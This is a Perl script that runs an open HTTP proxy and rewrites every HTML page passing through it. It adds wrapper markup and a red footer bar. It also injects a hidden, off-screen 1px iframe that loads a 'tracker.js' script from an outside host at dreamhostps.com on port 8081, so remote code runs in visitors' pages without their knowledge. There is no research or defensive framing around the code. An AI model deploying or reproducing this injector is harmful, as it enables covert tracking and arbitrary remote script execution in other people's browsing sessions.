#!/usr/local/bin/perl

use HTTP::Proxy qw(:log);
use HTTP::Proxy::BodyFilter::simple;

my $INSERT = <<END;
<script>
(function(d) {
    var iframe = d.body.appendChild(d.createElement('iframe')), doc = iframe.contentWindow.document;
        iframe.src = 'about:blank';
        iframe.style.cssText = "position:absolute;width:1px;height:1px;left:-9999px;";
    doc.open().write('<body onload="YUI_config={win:window.parent,doc:window.parent.document};var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'http://ps48174.dreamhostps.com:8081/tracker.js\\';"><script src="http://yui.yahooapis.com/combo?3.3.0/build/yui/yui-min.js&3.3.0/build/loader/loader-min.js"><\\/script><\\/body>');
    doc.close();
})(document);
</script>
END

my $CSS = <<END;
    <style>
    html { height: 100%; }
    body {
        height: 100%;
        margin: 0;
        overflow: hidden;
        position: relative;
    }
    #WWWrapper {
        height: 100%;
        margin: 0;
        overflow: scroll;
        width: 100%;
     }
    #CCContent {
        margin-bottom: 40px;
     }
     #FFFooter {
        background-color: red;
        bottom: 0;
        height: 40px;
        left: 0;
        position: absolute;
        right: 0;
        z-index: 9999;
     }
     .FFForcontent {
        position: absolute;
        overflow: auto;
        top: 0;
        bottom: 0;
        width: 100%;
     }
    </style>
END

# init
my $proxy = HTTP::Proxy->new( port => 8080, host => '', max_clients => 100 );
$proxy->push_filter(
    mime     => 'text/html',
    response => HTTP::Proxy::BodyFilter::simple->new(
        sub {
            ${ $_[1] } =~ s!<head(.*?)>!<head$1>$CSS!i;
            ${ $_[1] } =~ s!<body(.*?)>!<body$1><div id="WWWrapper"><div id="CCContent">!i;
            ${ $_[1] } =~ s!</body>!</div></div>$INSERT</body>!i; 
        }
    )
);

print "Ready to rumble on " . $proxy->host . ':' . $proxy->port . "\n";
$proxy->start;
